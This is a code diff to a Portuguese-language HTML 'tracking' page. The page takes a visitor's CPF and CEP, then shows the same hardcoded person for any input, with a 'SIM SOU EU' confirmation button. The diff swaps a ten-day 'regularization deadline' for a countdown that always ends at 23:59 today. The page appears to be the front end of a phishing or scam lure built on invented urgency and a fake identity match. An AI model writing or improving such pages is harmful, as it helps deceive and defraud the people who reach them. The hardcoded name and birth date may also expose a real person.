@@ -64,7 +64,7 @@
       font-family: Arial, sans-serif;
       color: #003157;
       box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
-      text-align: center; /* centraliza tudo */
+      text-align: center; /* Centraliza todo texto dentro do resultado */
     }
 
     #resultado h2 {
@@ -87,35 +87,29 @@
     #res-bairro,
     #res-rua {
       color: white !important;
-      background-color: #003157;
-      padding: 3px 6px;
-      border-radius: 4px;
-      display: inline-block;
-      min-width: 150px;
     }
 
-    /* Prazo em vermelho */
+    /* Prazo para regularização menor e vermelho */
     #res-prazo {
-      color: red !important;
+      font-size: 1rem; /* reduzido para o tamanho do formulário */
       font-weight: 700;
-      font-size: 1.2rem;
+      color: red;
     }
 
-    /* Botão azul "SIM SOU EU" */
-    #botao-confirmar {
-      margin-top: 30px;
-      background-color: #007bff;
-      border: none;
-      color: white;
-      padding: 12px 30px;
+    /* Botão "SIM SOU EU" azul */
+    #btn-sim-sou-eu {
+      margin-top: 1.5rem;
+      padding: 0.6rem 1.5rem;
       font-size: 1.1rem;
-      font-weight: 700;
-      border-radius: 6px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
 
-    #botao-confirmar:hover {
+    #btn-sim-sou-eu:hover {
       background-color: #0056b3;
     }
   </style>
@@ -195,7 +189,7 @@
       <p><span>Cidade:</span> <span id="res-cidade"></span></p>
       <p><span>Estado:</span> <span id="res-estado"></span></p>
       <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
-      <button id="botao-confirmar">SIM SOU EU</button>
+      <button id="btn-sim-sou-eu">SIM SOU EU</button>
     </section>
 
     <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
@@ -230,117 +224,106 @@
       return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
 
-    // Função para adicionar dias e formatar data dd/mm/aaaa às hh:mm
-    function formatarPrazo(dataBase, diasAdicionar, horas, minutos) {
-      const prazo = new Date(dataBase);
-      prazo.setDate(prazo.getDate() + diasAdicionar);
-      prazo.setHours(horas);
-      prazo.setMinutes(minutos);
-      prazo.setSeconds(0);
+    // Atualiza a contagem regressiva do prazo para regularização até 23:59 do dia atual
+    function atualizarContagemRegressiva() {
+      const agora = new Date();
+      const fimDoDia = new Date(
+        agora.getFullYear(),
+        agora.getMonth(),
+        agora.getDate(),
+        23,
+        59,
+        59
+      );
 
-      const dd = prazo.getDate().toString().padStart(2, "0");
-      const mm = (prazo.getMonth() + 1).toString().padStart(2, "0");
-      const yyyy = prazo.getFullYear();
-      const hh = prazo.getHours().toString().padStart(2, "0");
-      const min = prazo.getMinutes().toString().padStart(2, "0");
+      const diffMs = fimDoDia - agora;
+      if (diffMs <= 0) {
+        document.getElementById("res-prazo").textContent = "Prazo expirado";
+        clearInterval(intervalContagem);
+        return;
+      }
 
-      return { prazoDate: prazo, prazoStr: `${dd}/${mm}/${yyyy} às ${hh}:${min}` };
+      const horas = Math.floor(diffMs / (1000 * 60 * 60));
+      const minutos = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
+      const segundos = Math.floor((diffMs % (1000 * 60)) / 1000);
+
+      // Data formatada do dia atual
+      const dd = agora.getDate().toString().padStart(2, "0");
+      const mm = (agora.getMonth() + 1).toString().padStart(2, "0");
+      const yyyy = agora.getFullYear();
+
+      document.getElementById(
+        "res-prazo"
+      ).textContent = `${dd}/${mm}/${yyyy} às 23:59 (Tempo restante: ${horas
+        .toString()
+        .padStart(2, "0")}:${minutos.toString().padStart(2, "0")}:${segundos
+        .toString()
+        .padStart(2, "0")})`;
     }
 
-    // Atualiza contagem regressiva para o prazo na página
-    function startContagemRegressiva(prazoDate) {
-      const resPrazoSpan = document.getElementById("res-prazo");
+    let intervalContagem;
 
-      function atualizar() {
-        const agora = new Date();
-        const diff = prazoDate - agora;
+    document
+      .getElementById("form-rastreamento")
+      .addEventListener("submit", async function (event) {
+        event.preventDefault();
 
-        if (diff <= 0) {
-          resPrazoSpan.textContent = "Prazo expirado";
-          clearInterval(intervalId);
+        const cpfInput = document.getElementById("cpf");
+        const cepInput = document.getElementById("cep");
+
+        const cpfRaw = cpfInput.value.replace(/\D/g, "");
+        const cepRaw = cepInput.value.replace(/\D/g, "");
+
+        if (!cpfRaw || cpfRaw.length !== 11) {
+          alert("Por favor, insira um CPF válido.");
           return;
         }
 
-        const dias = Math.floor(diff / (1000 * 60 * 60 * 24));
-        const horas = Math.floor((diff / (1000 * 60 * 60)) % 24);
-        const minutos = Math.floor((diff / (1000 * 60)) % 60);
-        const segundos = Math.floor((diff / 1000) % 60);
+        if (!cepRaw || cepRaw.length !== 8) {
+          alert("Por favor, insira um CEP válido.");
+          return;
+        }
 
-        resPrazoSpan.textContent = `${dias}d ${horas}h ${minutos}m ${segundos}s`;
-      }
+        // Esconde botão e mostra loading
+        document.getElementById("botao-container").style.display = "none";
+        document.getElementById("loading-container").style.display = "block";
 
-      atualizar(); // primeira chamada imediata
-      const intervalId = setInterval(atualizar, 1000);
-    }
+        // Simulação de consulta — aqui você deve chamar seu backend real
+        // Simular delay de 2 segundos
+        await new Promise((resolve) => setTimeout(resolve, 2000));
 
-    document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
-      event.preventDefault();
+        // Dados fixos simulados - substituir para backend real
+        const dadosPessoa = {
+          nome: "Rosiane Oliveira Da Silva",
+          cpf: formatarCPF(cpfRaw),
+          nascimento: "27/01/1985",
+          cep: formatarCEP(cepRaw),
+          rua: "Rua das Acácias",
+          bairro: "Centro",
+          cidade: "Porciúncula",
+          estado: "RJ",
+          // Prazo será sempre até 23:59 do dia atual, controlado pela contagem regressiva
+        };
 
-      const cpfInput = document.getElementById("cpf");
-      const cepInput = document.getElementById("cep");
+        // Preencher resultado
+        document.getElementById("res-nome").textContent = dadosPessoa.nome;
+        document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
+        document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
+        document.getElementById("res-cep").textContent = dadosPessoa.cep;
+        document.getElementById("res-rua").textContent = dadosPessoa.rua;
+        document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
+        document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
+        document.getElementById("res-estado").textContent = dadosPessoa.estado;
 
-      const cpfRaw = cpfInput.value.replace(/\D/g, "");
-      const cepRaw = cepInput.value.replace(/\D/g, "");
+        // Exibe resultado e esconde formulário/loading
+        document.getElementById("loading-container").style.display = "none";
+        document.getElementById("tela-formulario").style.display = "none";
+        document.getElementById("resultado").style.display = "block";
 
-      if (!cpfRaw || cpfRaw.length !== 11) {
-        alert("Por favor, insira um CPF válido.");
-        return;
-      }
-
-      if (!cepRaw || cepRaw.length !== 8) {
-        alert("Por favor, insira um CEP válido.");
-        return;
-      }
-
-      // Esconde botão e mostra loading
-      document.getElementById("botao-container").style.display = "none";
-      document.getElementById("loading-container").style.display = "block";
-
-      // Simulação de consulta — aqui você deve chamar seu backend real
-      // Simular delay de 2 segundos
-      await new Promise((resolve) => setTimeout(resolve, 2000));
-
-      // Simulação de dados recebidos - substituir com dados reais da sua consulta
-      const { prazoDate, prazoStr } = formatarPrazo(new Date(), 10, 23, 59);
-      const dadosPessoa = {
-        nome: "Rosiane Oliveira Da Silva",
-        cpf: formatarCPF(cpfRaw),
-        nascimento: "27/01/1985",
-        cep: formatarCEP(cepRaw),
-        rua: "Rua das Acácias",
-        bairro: "Centro",
-        cidade: "Porciúncula",
-        estado: "RJ",
-        prazoRegularizacao: prazoStr, // só pra mostrar no console, mas a contagem regressiva será mostrada em segundos
-        prazoDate: prazoDate,
-      };
-
-      // Preencher resultado
-      document.getElementById("res-nome").textContent = dadosPessoa.nome;
-      document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
-      document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
-      document.getElementById("res-cep").textContent = dadosPessoa.cep;
-
-      // rua e bairro ficam em branco (mas conteúdo preenchido para acessibilidade)
-      const ruaSpan = document.getElementById("res-rua");
-      ruaSpan.textContent = dadosPessoa.rua;
-      ruaSpan.style.color = "white";
-
-      const bairroSpan = document.getElementById("res-bairro");
-      bairroSpan.textContent = dadosPessoa.bairro;
-      bairroSpan.style.color = "white";
-
-      document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
-      document.getElementById("res-estado").textContent = dadosPessoa.estado;
-
-      // A contagem regressiva será atualizada em #res-prazo
-      startContagemRegressiva(dadosPessoa.prazoDate);
-
-      // Esconde formulário e loading, mostra resultado
-      document.getElementById("loading-container").style.display = "none";
-      document.getElementById("tela-formulario").style.display = "none";
-      document.getElementById("resultado").style.display = "block";
-    });
+        // Inicia contagem regressiva
+        atualizarContagemRegressiva();
+        intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
+      });
   </script>
 </body>
 
